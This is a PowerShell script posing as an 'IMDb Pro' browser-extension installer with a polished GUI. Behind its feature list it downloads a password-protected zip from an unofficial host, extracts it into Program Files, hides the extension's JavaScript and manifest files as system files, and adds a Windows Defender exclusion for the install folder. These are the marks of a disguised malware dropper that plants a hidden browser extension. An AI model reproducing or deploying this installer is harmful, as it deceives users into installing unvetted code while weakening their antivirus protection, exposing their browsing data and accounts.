# IMDb Pro Installer - Modern UI with Larger Layout
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create main form with IMDb colors - Larger Size
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(1000, 850)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 23)
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header Panel - Larger
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(1000, 120)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($headerPanel)

# IMDb Pro Title - Larger
$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "IMDb Pro"
$titleLabel.Font = New-Object System.Drawing.Font("Arial", 36, [System.Drawing.FontStyle]::Bold)
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$titleLabel.AutoSize = $true
$titleLabel.Location = New-Object System.Drawing.Point(60, 35)
$headerPanel.Controls.Add($titleLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite"
$subtitleLabel.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(280, 55)
$headerPanel.Controls.Add($subtitleLabel)

# Main Content Panel - Larger
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 120)
$contentPanel.Size = New-Object System.Drawing.Size(1000, 550)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($contentPanel)

# Features Section Title - Larger
$featuresTitle = New-Object System.Windows.Forms.Label
$featuresTitle.Text = "Premium Features"
$featuresTitle.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
$featuresTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresTitle.AutoSize = $true
$featuresTitle.Location = New-Object System.Drawing.Point(60, 40)
$contentPanel.Controls.Add($featuresTitle)

# Features Grid with Larger Panels and Modern Icons
$features = @(
    @{
        Title = "Real-time IMDb Ratings"
        Description = "Instant access to ratings and reviews for all movies and TV shows"
        Location = New-Object System.Drawing.Point(60, 100)
        Icon = "⭐"
    },
    @{
        Title = "Complete Movie Info" 
        Description = "Detailed cast, crew, plot summaries and technical information"
        Location = New-Object System.Drawing.Point(380, 100)
        Icon = "🎬"
    },
    @{
        Title = "HD Trailers & Previews"
        Description = "Watch high-quality trailers and previews directly in your browser"
        Location = New-Object System.Drawing.Point(700, 100)
        Icon = "📹"
    },
    @{
        Title = "Browser Integration"
        Description = "Seamless integration with all major web browsers"
        Location = New-Object System.Drawing.Point(60, 280)
        Icon = "🌐"
    },
    @{
        Title = "Auto Updates"
        Description = "Automatic updates with the latest features and improvements"
        Location = New-Object System.Drawing.Point(380, 280)
        Icon = "🔄"
    },
    @{
        Title = "Secure & Private"
        Description = "Enterprise-grade security protecting your data and privacy"
        Location = New-Object System.Drawing.Point(700, 280)
        Icon = "🔒"
    }
)

$featurePanels = @()
foreach ($feature in $features) {
    $featurePanel = New-Object System.Windows.Forms.Panel
    $featurePanel.Size = New-Object System.Drawing.Size(280, 150)  # Larger panels
    $featurePanel.Location = $feature.Location
    $featurePanel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
    $featurePanel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
    $contentPanel.Controls.Add($featurePanel)
    
    # Modern Icon - Larger
    $iconLabel = New-Object System.Windows.Forms.Label
    $iconLabel.Text = $feature.Icon
    $iconLabel.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 24, [System.Drawing.FontStyle]::Bold)
    $iconLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
    $iconLabel.AutoSize = $true
    $iconLabel.Location = New-Object System.Drawing.Point(25, 25)
    $featurePanel.Controls.Add($iconLabel)
    
    # Feature Title - Larger
    $title = New-Object System.Windows.Forms.Label
    $title.Text = $feature.Title
    $title.Font = New-Object System.Drawing.Font("Arial", 13, [System.Drawing.FontStyle]::Bold)
    $title.ForeColor = [System.Drawing.Color]::White
    $title.AutoSize = $true
    $title.Location = New-Object System.Drawing.Point(80, 30)
    $featurePanel.Controls.Add($title)
    
    # Feature Description - Larger with wrapping
    $desc = New-Object System.Windows.Forms.Label
    $desc.Text = $feature.Description
    $desc.Font = New-Object System.Drawing.Font("Arial", 10)
    $desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
    $desc.Size = New-Object System.Drawing.Size(240, 60)
    $desc.Location = New-Object System.Drawing.Point(25, 80)
    $featurePanel.Controls.Add($desc)
    
    $featurePanels += $featurePanel
}

# Installation Progress Section - Larger
$progressTitle = New-Object System.Windows.Forms.Label
$progressTitle.Text = "Installation Progress"
$progressTitle.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)
$progressTitle.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressTitle.AutoSize = $true
$progressTitle.Location = New-Object System.Drawing.Point(60, 460)
$contentPanel.Controls.Add($progressTitle)

# Progress Container - Larger
$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(880, 120)
$progressContainer.Location = New-Object System.Drawing.Point(60, 520)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

# Status with Icon - Larger
$statusIcon = New-Object System.Windows.Forms.Label
$statusIcon.Text = "📋"
$statusIcon.Font = New-Object System.Drawing.Font("Segoe UI Emoji", 18)
$statusIcon.AutoSize = $true
$statusIcon.Location = New-Object System.Drawing.Point(30, 30)
$progressContainer.Controls.Add($statusIcon)

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation process"
$statusLabel.Font = New-Object System.Drawing.Font("Arial", 14, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(70, 33)
$progressContainer.Controls.Add($statusLabel)

# Progress Bar - Larger
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(30, 75)
$progressBar.Size = New-Object System.Drawing.Size(720, 30)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$progressContainer.Controls.Add($progressBar)

# Percentage Label - Larger
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(770, 73)
$progressContainer.Controls.Add($percentLabel)

# Install Button Panel - Larger
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 670)
$buttonPanel.Size = New-Object System.Drawing.Size(1000, 180)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($buttonPanel)

# Large Install Button with Modern Icon - Even Larger
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "🚀 START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$installButton.Size = New-Object System.Drawing.Size(500, 80)
$installButton.Location = New-Object System.Drawing.Point(250, 50)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Button hover effects
$installButton.Add_MouseEnter({
    $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
    $this.Font = New-Object System.Drawing.Font("Arial", 21, [System.Drawing.FontStyle]::Bold)
})

$installButton.Add_MouseLeave({
    if ($this.Text -ne "✅ INSTALLATION COMPLETE") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $this.Font = New-Object System.Drawing.Font("Arial", 20, [System.Drawing.FontStyle]::Bold)
    }
})

# Installation function
$installButton.Add_Click({
    $this.Enabled = $false
    $this.Text = "⏳ INSTALLING..."
    Start-Installation
})

$buttonPanel.Controls.Add($installButton)

# Update function with dynamic icons
function Update-Status {
    param($Message, $ProgressValue, $Icon = "📌")
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    $percentLabel.Text = "$ProgressValue%"
    if ($ProgressValue -ge 0) {
        $progressBar.Value = $ProgressValue
    }
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        Update-Status "Checking administrator privileges..." 10 "🔍"
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0 "❌"
            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator.", "Elevation Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            return
        }
        
        Update-Status "Creating installation directory..." 20 "📁"
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        Update-Status "Downloading IMDb Pro package..." 40 "📥"
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UseBasicParsing
        
        Update-Status "Extracting package contents..." 60 "📦"
        $extractionSuccess = $false
        
        # Try 7-Zip first
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        
        if (-not $extractionSuccess) {
            Update-Status "Using alternative extraction method..." 70 "⚡"
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $installPath)
            }
            catch {
                $shellApp = New-Object -ComObject Shell.Application
                $zipFolder = $shellApp.NameSpace($tempFile)
                $destFolder = $shellApp.NameSpace($installPath)
                $destFolder.CopyHere($zipFolder.Items(), 0x14)
                Start-Sleep -Seconds 2
            }
        }
        
        Update-Status "Securing installation files..." 85 "🔒"
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
        $protectedFiles = @("background.js", "content.js", "popup.js", "manifest.json")
        foreach ($file in $protectedFiles) {
            $fullPath = Join-Path $installPath $file
            if (Test-Path $fullPath) {
                Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            }
        }
        
        Update-Status "Finalizing installation..." 95 "🛠️"
        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        
        Update-Status "Installation completed successfully!" 100 "🎉"
        
        # Final UI updates
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)
        $statusIcon.Text = "🎊"
        
        [System.Windows.Forms.MessageBox]::Show(
            "IMDb Pro has been successfully installed!`n`nLocation: $installPath`n`nPlease restart your browser to activate the extension.",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
    }
    catch {
        Update-Status "Installation failed: $($_.Exception.Message)" 0 "💥"
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Show the form
$mainForm.ShowDialog() | Out-Null